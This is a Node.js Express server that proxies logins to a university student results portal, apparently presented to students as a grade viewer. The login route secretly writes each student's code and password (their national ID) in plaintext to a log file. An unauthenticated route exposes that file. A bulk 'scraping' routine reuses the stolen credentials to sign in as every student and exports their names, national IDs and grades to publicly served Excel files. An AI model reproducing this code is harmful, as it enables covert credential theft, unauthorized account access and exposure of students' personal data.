const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const path = require('path');
const https = require('https');
const fs = require('fs');
const excel = require('exceljs');

// Create an HTTPS agent that ignores SSL certificate errors
const httpsAgent = new https.Agent({
    rejectUnauthorized: false
});

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());

// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

const BASE_URL = 'https://studentportalsis.azu.edu.eg';
const LOGIN_URL = `${BASE_URL}/Default.aspx`;
const RESULTS_URL = `${BASE_URL}/UI/StudentView/student_sem_work_Modular.aspx`;

// Helper: Extract ViewState and other ASP.NET hidden fields
const extractHiddenFields = (html) => {
    const $ = cheerio.load(html);
    return {
        __VIEWSTATE: $('#__VIEWSTATE').val() || '',
        __VIEWSTATEGENERATOR: $('#__VIEWSTATEGENERATOR').val() || '',
        __EVENTVALIDATION: $('#__EVENTVALIDATION').val() || '',
        __EVENTTARGET: $('#__EVENTTARGET').val() || '',
        __EVENTARGUMENT: $('#__EVENTARGUMENT').val() || ''
    };
};

// Route: Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان' });
    }

    try {
        // 1. Get initial page which often responds with 302 to set the Session ID
        const firstResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        let cookies = firstResponse.headers['set-cookie'] || [];
        let sessionCookie = cookies.find(c => c.startsWith('ASP.NET_SessionId='));
        let cookieHeader = '';
        if (sessionCookie) {
            cookieHeader = sessionCookie.split(';')[0];
        }

        // 1.5 Fetch the actual HTML page now that we have the session cookie
        const htmlResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const hiddenFields = extractHiddenFields(htmlResponse.data);

        // 2. Prepare Form Data for Login
        const formData = new URLSearchParams();
        formData.append('__EVENTTARGET', '');
        formData.append('__EVENTARGUMENT', '');
        formData.append('__VIEWSTATE', hiddenFields.__VIEWSTATE);
        formData.append('__VIEWSTATEGENERATOR', hiddenFields.__VIEWSTATEGENERATOR);
        formData.append('__EVENTVALIDATION', hiddenFields.__EVENTVALIDATION);
        formData.append('txtUsername', username);
        formData.append('txtPassword', password);
        formData.append('btnEnter', 'دخول'); // Ensure it matches the submit button's value if required

        // 3. Post login
        const loginResponse = await axios.post(LOGIN_URL, formData, {
            httpsAgent,
            maxRedirects: 0, // IMPORTANT: Do not follow redirects so we can capture cookies
            validateStatus: function (status) {
                return status >= 200 && status < 400; // Resolve even on 302 redirect
            },
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const newCookies = loginResponse.headers['set-cookie'] || [];
        const authCookie = newCookies.find(c => c.includes('.ASPXAUTH'));

        if (loginResponse.status === 302 || authCookie) {
            // Login successful
            // Combine session cookie and auth cookie
            let finalCookies = [];
            if (sessionCookie) finalCookies.push(sessionCookie.split(';')[0]);
            if (authCookie) finalCookies.push(authCookie.split(';')[0]);

            // Log successful login
            const logEntry = `[${new Date().toISOString()}] Student Code: ${username} | National ID / Password: ${password}\n`;
            require('fs').appendFileSync('logins.txt', logEntry, 'utf8');

            res.json({
                success: true,
                message: 'تم تسجيل الدخول بنجاح',
                sessionToken: finalCookies.join('; '),
                nationalId: password // Pass back the password as the National ID to the frontend
            });
        } else {
            // Failed login - usually returns 200 with an error message in HTML
            const $ = cheerio.load(loginResponse.data);
            const errorMessage = $('#lblError').text() || 'خطأ في بيانات الدخول';
            res.status(401).json({ success: false, message: errorMessage });
        }

    } catch (error) {
        console.error('Login Error:', error.message);
        res.status(500).json({ success: false, message: 'حدث خطأ أثناء الاتصال بالخادم. حاول مجدداً.' });
    }
});

// Route: Get Results
app.post('/api/results', async (req, res) => {
    const { sessionToken, year, semester, round } = req.body;
    console.log(`[RESULTS] Request received for Year: ${year}, Semester: ${semester}, Round: ${round}`);
    console.log(`[RESULTS] Using Session Token: ${sessionToken}`);

    if (!sessionToken) {
        return res.status(401).json({ success: false, message: 'غير مصرح لك. يرجى تسجيل الدخول مجدداً' });
    }

    try {
        console.log(`[RESULTS] Fetching initial RESULTS_URL to get ViewState...`);
        // 1. Get Results page to extract initial ViewState for the results form
        const initialResponse = await axios.get(RESULTS_URL, {
            httpsAgent,
            headers: {
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const hiddenFields = extractHiddenFields(initialResponse.data);
        console.log(`[RESULTS] Extracted ViewState length: ${hiddenFields.__VIEWSTATE.length}`);

        // 2. Prepare Form Data to request specific results
        const formData = new URLSearchParams();

        // Dynamically append ALL hidden inputs from the page
        const $initial = cheerio.load(initialResponse.data);
        $initial('input[type="hidden"]').each((i, el) => {
            const name = $initial(el).attr('name');
            const value = $initial(el).val() || '';
            if (name) {
                formData.append(name, value);
            }
        });

        // Form specific fields
        formData.append('ctl00$cntphmaster$ACadYearDropDownList', year);
        formData.append('ctl00$cntphmaster$semesterDropDownList', semester);
        formData.append('ctl00$cntphmaster$drpExamType', round);

        // Submit button
        formData.append('ctl00$cntphmaster$searchButton', 'بحث');

        console.log(`[RESULTS] Prepared Form Data. Submitting POST...`);

        // 3. Post request for results
        const resultResponse = await axios.post(RESULTS_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 600,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': RESULTS_URL
            }
        });

        console.log(`[RESULTS] Response Status: ${resultResponse.status}`);

        const responseData = resultResponse.data;

        if (resultResponse.status >= 400) {
            console.error(`[RESULTS] Server returned error ${resultResponse.status}. HTML Snippet:`);
            console.error(responseData.toString().substring(0, 500));
            return res.status(500).json({ success: false, message: `فشل جلب النتيجة. كود الخطأ: ${resultResponse.status}` });
        }

        // The response is a standard HTML document now
        const $ = cheerio.load(responseData);
        const resultsTable = $('#ctl00_cntphmaster_GridView1'); // The correct table ID in the new modular system

        console.log(`[RESULTS] Found Results Table? ${resultsTable.length > 0 ? 'Yes' : 'No'}`);

        if (!resultsTable.length) {
            // Log full output if table not found to debug
            const fs = require('fs');
            fs.writeFileSync('debug_failed_results_response.html', responseData);
            console.log('[RESULTS] Saved response html to debug_failed_results_response.html');
            return res.json({ success: true, data: [], message: 'لم يتم العثور على نتائج لهذه البيانات' });
        }

        const results = [];
        let totalMarksSum = 0;

        // Parse table rows, skipping the header row
        resultsTable.find('tr').each((index, element) => {
            if (index === 0) return; // Skip header

            const tds = $(element).find('td');
            if (tds.length >= 5) {
                const finalMarkStr = $(tds[3]).text().trim();
                const finalMarkVal = parseFloat(finalMarkStr) || 0;
                totalMarksSum += finalMarkVal;

                results.push({
                    subjectCode: $(tds[0]).text().trim(),
                    subjectName: $(tds[1]).text().trim(),
                    status: $(tds[2]).text().trim(),
                    finalMark: finalMarkStr,
                    grade: $(tds[4]).text().trim()
                });
            }
        });

        console.log(`[RESULTS] Successfully extracted ${results.length} subjects.`);

        // Extract student details if available (name, total percentage, etc.)
        const studentName = $('#ctl00_lblUser').text() || '';
        const faculty = $('.logo_Text').text() || '';
        const level = $('#ctl00_lblAdmYear').text() || '';

        // Extract GPA modular info
        let gpa1 = '';
        let gpau1 = '';
        const modularTableTd = $('#ctl00_cntphmaster_pnl_Modular table tr td');
        modularTableTd.each((i, el) => {
            const txt = $(el).text().trim();
            if (txt.includes('GPA1')) gpa1 = $(modularTableTd[i + 1]).text().trim();
            if (txt.includes('GPAU1')) gpau1 = $(modularTableTd[i + 1]).text().trim();
        });

        res.json({
            success: true,
            data: results,
            totalMarksSum: totalMarksSum,
            studentInfo: {
                name: studentName,
                faculty: faculty,
                level: level,
                gpa1: gpa1,
                gpau1: gpau1
            }
        });

    } catch (error) {
        console.error('[RESULTS] Catch Error:', error.message);
        console.error(error.stack);
        res.status(500).json({ success: false, message: 'حدث خطأ غير متوقع أثناء الاتصال بالخادم.' });
    }
});

// Route: Get Logins (Admin View)
app.get('/api/logins', (req, res) => {
    try {
        const fs = require('fs');
        if (fs.existsSync('logins.txt')) {
            const data = fs.readFileSync('logins.txt', 'utf8');
            const lines = data.split('\n').filter(line => line.trim() !== '');
            res.json({ success: true, logins: lines });
        } else {
            res.json({ success: true, logins: [] });
        }
    } catch (e) {
        res.status(500).json({ success: false, message: 'تعذر قراءة ملف التسجيلات' });
    }
});

// Route: Start Scraping (Deduplicate logins and start process)
let isScraping = false;
let stopRequested = false;
let scraperClients = [];
let scrapeProgress = { total: 0, current: 0, successCount: 0, failCount: 0, results: [] };

app.post('/api/start-scraping', async (req, res) => {
    if (isScraping) {
        return res.status(400).json({ success: false, message: 'عملية السحب قيد التشغيل بالفعل.' });
    }

    try {
        if (!fs.existsSync('logins.txt')) {
            return res.status(400).json({ success: false, message: 'ملف logins.txt غير موجود.' });
        }

        const data = fs.readFileSync('logins.txt', 'utf8');
        const lines = data.split('\n').filter(line => line.trim() !== '');

        // Extract and deduplicate
        const uniqueStudents = new Map();
        lines.forEach(line => {
            // Adjust regex if format differs
            const match = line.match(/Student Code:\s*(\d+)\s*\|\s*National ID \/ Password:\s*([a-zA-Z0-9]+)/i);
            if (match) {
                const username = match[1];
                const password = match[2];
                // Keep the last valid login for a student code
                uniqueStudents.set(username, password);
            }
        });

        const studentsToScrape = Array.from(uniqueStudents.entries()).map(([username, password]) => ({ username, password }));

        if (studentsToScrape.length === 0) {
            return res.status(400).json({ success: false, message: 'لم يتم العثور على بيانات صحيحة في ملف logins.txt.' });
        }

        // Initialize state
        isScraping = true;
        scrapeProgress = {
            total: studentsToScrape.length,
            current: 0,
            successCount: 0,
            failCount: 0,
            results: []
        };

        res.json({ success: true, message: 'تم بدء عملية السحب.' });

        // Start background scraping
        runScraperBackground(studentsToScrape);

    } catch (error) {
        console.error('Error starting scrape:', error);
        isScraping = false;
        res.status(500).json({ success: false, message: 'تعذر بدء عملية السحب.' });
    }
});

// Route: Stop Scraping
app.post('/api/stop-scraping', (req, res) => {
    if (!isScraping) {
        return res.json({ success: false, message: 'لا توجد عملية سحب قيد التشغيل.' });
    }
    stopRequested = true;
    res.json({ success: true, message: 'تم طلب إيقاف السحب. سيتوقف بعد الطالب الحالي.' });
});

// SSE Endpoint for Scrape Stream
app.get('/api/scrape-stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    scraperClients.push(res);

    // Initial message
    res.write(`data: ${JSON.stringify({ type: 'init', total: scrapeProgress.total })}\n\n`);

    req.on('close', () => {
        scraperClients = scraperClients.filter(client => client !== res);
    });
});

const sendSSEScrapingUpdate = (data) => {
    scraperClients.forEach(client => {
        client.write(`data: ${JSON.stringify(data)}\n\n`);
    });
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ==================== HELPER FUNCTIONS ====================

const MAX_PORTAL_YEAR = 16; // 2025/2026 is the latest year to scrape
const PORTAL_SEMESTERS = ['1', '2']; // Portal semester 1=أول, 2=ثانى
const ROUNDS = ['1', '2']; // دور أول + دور ثاني

/**
 * Extract the starting academic year portal value from a student code.
 * e.g. "120240002454" → skip 3 chars → "24" → 2024/2025 → portal value 15
 *      "120230000386" → "23" → 2023/2024 → portal value 14
 */
function getStartPortalYear(studentCode) {
    const yearDigits = studentCode.substring(3, 5); // skip first 3, take next 2
    const startYear = 2000 + parseInt(yearDigits, 10); // e.g. 24 → 2024
    const portalValue = startYear - 2009; // 2024 → 15, 2023 → 14
    return portalValue;
}

/**
 * Convert a portal year value to a display string.
 * e.g. 15 → "2024/2025", 16 → "2025/2026"
 */
function portalYearToLabel(portalYear) {
    const startYear = portalYear + 2009;
    return `${startYear}/${startYear + 1}`;
}

/**
 * Extract the semester code (e.g. "01", "02", "03") from a subject code.
 * Subject code format: "IMP07-10102_01" or "URR07-10101_01"
 * The numeric part after the dash: "10102" → parse as 1|01|02
 * - First digit: year level
 * - Next two digits: semester code (01, 02, 03, etc.)
 * - Last two digits: subject number
 *
 * Returns the semester code string or null if can't parse.
 */
function getTermFromSubjectCode(subjectCode) {
    // Extract the numeric portion after the dash, before underscore
    // e.g. "IMP07-10102_01" → we need "10102"
    const match = subjectCode.match(/-(\d{5,})/);
    if (!match) return null;

    const numericPart = match[1];
    // Format: X YY ZZ (year_level, semester_code, subject_num)
    // Take chars at index 1-2 for semester code
    const semCode = numericPart.substring(1, 3);
    return semCode; // "01", "02", "03", etc.
}

/**
 * Map a semester code to the output term key.
 * "01" → "term1", "02" → "term2", "03" → "term3"
 * Anything else → null (ignored)
 */
function semCodeToTermKey(semCode) {
    if (semCode === '01') return 'term1';
    if (semCode === '02') return 'term2';
    if (semCode === '03') return 'term3';
    return null; // 04+ is ignored
}

// ==================== SCRAPER BACKGROUND ====================

const runScraperBackground = async (students) => {
    console.log(`[SCRAPER] Starting background scrape for ${students.length} students.`);

    // Collect results per term across all students
    const allTermResults = {
        term1: [],
        term2: [],
        term3: []
    };

    for (let i = 0; i < students.length; i++) {
        const student = students[i];
        try {
            if (i > 0) {
                await delay(2000);
            }

            console.log(`[SCRAPER] Processing ${student.username} (${i + 1}/${students.length})`);

            // --- 1. Determine year range for this student ---
            const startPortalYear = getStartPortalYear(student.username);
            const yearRange = [];
            for (let y = startPortalYear; y <= MAX_PORTAL_YEAR; y++) {
                yearRange.push(y);
            }
            console.log(`[SCRAPER]   Student ${student.username}: start year=${portalYearToLabel(startPortalYear)}, scraping ${yearRange.length} years`);

            // --- 2. LOGIN ---
            const loginResult = await performLogin(student.username, student.password);
            if (!loginResult.success) {
                throw new Error(loginResult.message);
            }

            // --- 3. GET RESULTS for all year/semester/round combinations ---
            // Collect ALL subjects with metadata about when they were fetched
            // Key: subjectCode → { subject, queryOrder } (latest queryOrder wins)
            const subjectMap = new Map();
            let studentName = '';
            let gpa1 = '';
            let gpau1 = '';
            let queryOrder = 0;

            const totalQueries = yearRange.length * PORTAL_SEMESTERS.length * ROUNDS.length;
            sendSSEScrapingUpdate({
                type: 'student_start',
                student: student.username,
                startYear: portalYearToLabel(startPortalYear),
                yearCount: yearRange.length,
                totalQueries: totalQueries,
                index: i + 1,
                total: students.length
            });

            for (const portalYear of yearRange) {
                for (const portalSem of PORTAL_SEMESTERS) {
                    for (const round of ROUNDS) {
                        queryOrder++;
                        const label = `${portalYearToLabel(portalYear)} Sem${portalSem} Round${round}`;
                        console.log(`[SCRAPER]   Fetching: ${label}`);

                        // Send query-level SSE update
                        sendSSEScrapingUpdate({
                            type: 'query',
                            student: student.username,
                            queryLabel: label,
                            queryNum: queryOrder,
                            totalQueries: totalQueries
                        });

                        await delay(1000);

                        const resultsData = await performGetResults(
                            loginResult.sessionToken,
                            String(portalYear),
                            portalSem,
                            round
                        );

                        if (resultsData.success && resultsData.data && resultsData.data.length > 0) {
                            studentName = resultsData.studentInfo.name || studentName;
                            gpa1 = resultsData.studentInfo.gpa1 || gpa1;
                            gpau1 = resultsData.studentInfo.gpau1 || gpau1;

                            // Store/overwrite each subject - later queries always win
                            resultsData.data.forEach(sub => {
                                subjectMap.set(sub.subjectCode, {
                                    ...sub,
                                    _queryOrder: queryOrder
                                });
                            });
                        }
                    }
                }
            }


            // --- 4. Assign subjects to terms based on SUBJECT CODE ---
            const termSubjects = { term1: [], term2: [], term3: [] };

            for (const [code, sub] of subjectMap) {
                const semCode = getTermFromSubjectCode(code);
                if (!semCode) {
                    console.log(`[SCRAPER]   WARNING: Could not parse term from subject code: ${code}, skipping.`);
                    continue;
                }

                const termKey = semCodeToTermKey(semCode);
                if (!termKey) {
                    // Semester code is 04 or higher → ignore
                    console.log(`[SCRAPER]   Ignoring subject ${code} with semester code ${semCode} (> 03)`);
                    continue;
                }

                // Remove internal metadata before storing
                const { _queryOrder, ...cleanSub } = sub;
                termSubjects[termKey].push(cleanSub);
            }

            // --- 5. Push to results per term ---
            for (const termKey of ['term1', 'term2', 'term3']) {
                const subjects = termSubjects[termKey];
                if (subjects.length === 0) continue;

                const totalMarks = subjects.reduce(
                    (sum, s) => sum + (parseFloat(s.finalMark) || 0), 0
                );

                allTermResults[termKey].push({
                    studentCode: student.username,
                    nationalId: student.password,
                    studentName: studentName || 'بدون اسم',
                    totalMarksSum: totalMarks,
                    gpa1: gpa1 || '',
                    gpau1: gpau1 || '',
                    subjects: subjects
                });
            }

            scrapeProgress.successCount++;

            sendSSEScrapingUpdate({
                type: 'progress',
                status: 'success',
                student: student.username,
                ...scrapeProgress
            });

            // Check if stop was requested after finishing this student
            if (stopRequested) {
                console.log(`[SCRAPER] Stop requested after processing ${student.username}`);
                sendSSEScrapingUpdate({ type: 'info', message: `⏹️ تم إيقاف السحب بعد الطالب ${student.username}` });
                // Immediately jump to Excel generation with whatever we have so far
                break;
            }

        } catch (error) {
            console.error(`[SCRAPER] Error processing ${student.username}:`, error.message);
            scrapeProgress.failCount++;

            sendSSEScrapingUpdate({
                type: 'progress',
                status: 'error',
                student: student.username,
                message: error.message,
                ...scrapeProgress
            });
        }

        scrapeProgress.current++;
    }

    // Finished processing all. Now export to 3 Excel files.
    try {
        const files = await generateMultiExcelReport(allTermResults);

        sendSSEScrapingUpdate({
            type: 'complete',
            files: files
        });

    } catch (e) {
        console.error('[SCRAPER] Excel generation error:', e);
        sendSSEScrapingUpdate({
            type: 'error',
            message: 'Failed to generate Excel files: ' + e.message
        });
    }

    isScraping = false;
    stopRequested = false;
    scraperClients.forEach(client => client.end());
    scraperClients = [];
};

// Extracted internal logic from login API
async function performLogin(username, password) {
    try {
        const firstResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            }
        });

        let cookies = firstResponse.headers['set-cookie'] || [];
        let sessionCookie = cookies.find(c => c.startsWith('ASP.NET_SessionId='));
        let cookieHeader = '';
        if (sessionCookie) {
            cookieHeader = sessionCookie.split(';')[0];
        }

        const htmlResponse = await axios.get(LOGIN_URL, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const hiddenFields = extractHiddenFields(htmlResponse.data);

        const formData = new URLSearchParams();
        formData.append('__EVENTTARGET', '');
        formData.append('__EVENTARGUMENT', '');
        formData.append('__VIEWSTATE', hiddenFields.__VIEWSTATE);
        formData.append('__VIEWSTATEGENERATOR', hiddenFields.__VIEWSTATEGENERATOR);
        formData.append('__EVENTVALIDATION', hiddenFields.__EVENTVALIDATION);
        formData.append('txtUsername', username);
        formData.append('txtPassword', password);
        formData.append('btnEnter', 'دخول');

        const loginResponse = await axios.post(LOGIN_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: function (status) {
                return status >= 200 && status < 400;
            },
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                ...(cookieHeader ? { 'Cookie': cookieHeader } : {})
            }
        });

        const newCookies = loginResponse.headers['set-cookie'] || [];
        const authCookie = newCookies.find(c => c.includes('.ASPXAUTH'));

        if (loginResponse.status === 302 || authCookie) {
            let finalCookies = [];
            if (sessionCookie) finalCookies.push(sessionCookie.split(';')[0]);
            if (authCookie) finalCookies.push(authCookie.split(';')[0]);
            return { success: true, sessionToken: finalCookies.join('; ') };
        } else {
            return { success: false, message: 'بيانات الدخول غير صحيحة' };
        }
    } catch (e) {
        console.error('[SCRAPER] performLogin error:', e.message);
        return { success: false, message: 'Login connection failed: ' + e.message };
    }
}

// Extracted internal logic from results API
async function performGetResults(sessionToken, year, semester, round) {
    try {
        const initialResponse = await axios.get(RESULTS_URL, {
            httpsAgent,
            headers: {
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const formData = new URLSearchParams();
        const $initial = cheerio.load(initialResponse.data);
        $initial('input[type="hidden"]').each((i, el) => {
            const name = $initial(el).attr('name');
            const value = $initial(el).val() || '';
            if (name) formData.append(name, value);
        });

        formData.append('ctl00$cntphmaster$ACadYearDropDownList', year);
        formData.append('ctl00$cntphmaster$semesterDropDownList', semester);
        formData.append('ctl00$cntphmaster$drpExamType', round);
        formData.append('ctl00$cntphmaster$searchButton', 'بحث');

        const resultResponse = await axios.post(RESULTS_URL, formData, {
            httpsAgent,
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 600,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': sessionToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': RESULTS_URL
            }
        });

        if (resultResponse.status >= 400) {
            return { success: false, message: `Server error ${resultResponse.status}` };
        }

        const $ = cheerio.load(resultResponse.data);
        const resultsTable = $('#ctl00_cntphmaster_GridView1');

        if (!resultsTable.length) {
            return { success: false, message: 'No results found' };
        }

        const results = [];
        let totalMarksSum = 0;

        resultsTable.find('tr').each((index, element) => {
            if (index === 0) return;
            const tds = $(element).find('td');
            if (tds.length >= 5) {
                const finalMarkStr = $(tds[3]).text().trim();
                const finalMarkVal = parseFloat(finalMarkStr) || 0;
                totalMarksSum += finalMarkVal;

                results.push({
                    subjectCode: $(tds[0]).text().trim(),
                    subjectName: $(tds[1]).text().trim(),
                    status: $(tds[2]).text().trim(),
                    finalMark: finalMarkStr,
                    grade: $(tds[4]).text().trim()
                });
            }
        });

        const studentName = $('#ctl00_lblUser').text() || '';

        let gpa1 = '';
        let gpau1 = '';
        const modularTableTd = $('#ctl00_cntphmaster_pnl_Modular table tr td');
        modularTableTd.each((i, el) => {
            const txt = $(el).text().trim();
            if (txt.includes('GPA1')) gpa1 = $(modularTableTd[i + 1]).text().trim();
            if (txt.includes('GPAU1')) gpau1 = $(modularTableTd[i + 1]).text().trim();
        });

        return {
            success: true,
            data: results,
            totalMarksSum,
            studentInfo: { name: studentName, gpa1, gpau1 }
        };

    } catch (e) {
        return { success: false, message: 'Results fetch failed' };
    }
}

// Generate a single Excel workbook for one semester
async function generateSingleExcel(resultsArray, sheetName, fileName) {
    const workbook = new excel.Workbook();
    workbook.creator = 'Admin Scraper';
    const worksheet = workbook.addWorksheet(sheetName);

    // Collect all dynamic subjects
    const uniqueSubjects = new Set();
    resultsArray.forEach(student => {
        student.subjects.forEach(subject => {
            uniqueSubjects.add(subject.subjectName);
        });
    });

    const subjectsArray = Array.from(uniqueSubjects);

    // Build Column definitions
    const columns = [
        { header: 'الأسم', key: 'name', width: 30 },
        { header: 'كود الطالب', key: 'code', width: 20 },
        { header: 'الرقم القومي', key: 'nid', width: 20 }
    ];

    subjectsArray.forEach(subject => {
        columns.push({ header: `${subject}_degree`, key: `${subject}_degree`, width: 15 });
        columns.push({ header: `${subject}_grade`, key: `${subject}_grade`, width: 15 });
    });

    columns.push({ header: 'GPA1', key: 'gpa1', width: 10 });
    columns.push({ header: 'GPAU1', key: 'gpau1', width: 10 });
    columns.push({ header: 'المجموع الكلي', key: 'total', width: 15 });

    worksheet.columns = columns;

    // Style headers
    worksheet.getRow(1).font = { bold: true };
    worksheet.getRow(1).alignment = { vertical: 'middle', horizontal: 'center' };

    // Fill Data
    resultsArray.forEach(student => {
        const rowData = {
            name: student.studentName,
            gpa1: student.gpa1,
            gpau1: student.gpau1,
            total: student.totalMarksSum
        };

        student.subjects.forEach(sub => {
            rowData[`${sub.subjectName}_degree`] = sub.finalMark;
            rowData[`${sub.subjectName}_grade`] = sub.grade;
        });

        const row = worksheet.addRow(rowData);

        const codeCell = row.getCell('code');
        codeCell.value = student.studentCode;
        codeCell.numFmt = '@';

        const nidCell = row.getCell('nid');
        nidCell.value = student.nationalId;
        nidCell.numFmt = '@';

        row.alignment = { vertical: 'middle', horizontal: 'center' };
    });

    const filePath = path.join(__dirname, 'public', fileName);
    await workbook.xlsx.writeFile(filePath);
    return fileName;
}

// Generate 3 Excel files (one per term)
async function generateMultiExcelReport(allTermResults) {
    const timestamp = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 14);
    const files = [];

    const termMeta = [
        { key: 'term1', sheet: 'Term 1', file: `term1_${timestamp}.xlsx` },
        { key: 'term2', sheet: 'Term 2', file: `term2_${timestamp}.xlsx` },
        { key: 'term3', sheet: 'Term 3', file: `term3_${timestamp}.xlsx` }
    ];

    for (const meta of termMeta) {
        const results = allTermResults[meta.key] || [];
        if (results.length > 0) {
            const fileName = await generateSingleExcel(results, meta.sheet, meta.file);
            files.push({ fileName, label: meta.sheet, count: results.length });
            console.log(`[SCRAPER] Generated ${fileName} with ${results.length} students.`);
        } else {
            console.log(`[SCRAPER] No results for ${meta.sheet}, skipping file generation.`);
        }
    }

    return files;
}

// Route: Download Excel File
app.get('/api/download-excel', (req, res) => {
    const fileName = req.query.file;
    if (!fileName || !fileName.endsWith('.xlsx')) {
        return res.status(400).send('Invalid file');
    }

    const filePath = path.join(__dirname, 'public', fileName);
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
